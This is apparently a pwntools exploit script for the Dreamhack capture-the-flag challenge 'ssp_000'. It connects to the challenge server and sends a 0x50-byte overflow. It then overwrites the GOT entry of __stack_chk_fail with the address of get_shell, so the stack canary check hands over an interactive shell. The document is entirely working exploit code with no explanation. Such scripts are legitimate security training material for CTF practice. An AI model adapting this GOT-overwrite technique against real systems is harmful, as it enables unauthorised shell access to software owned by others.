from pwn import *

context.arch = "amd64"

p = remote("host3.dreamhack.games", 20780)

e = ELF("./ssp_000")
get_shell = e.symbols['get_shell']
canary_fail_got = e.got['__stack_chk_fail']

payload = b'a'*0x50

p.send(payload)
p.sendline(str(canary_fail_got))
p.sendline(str(get_shell))

p.interactive()
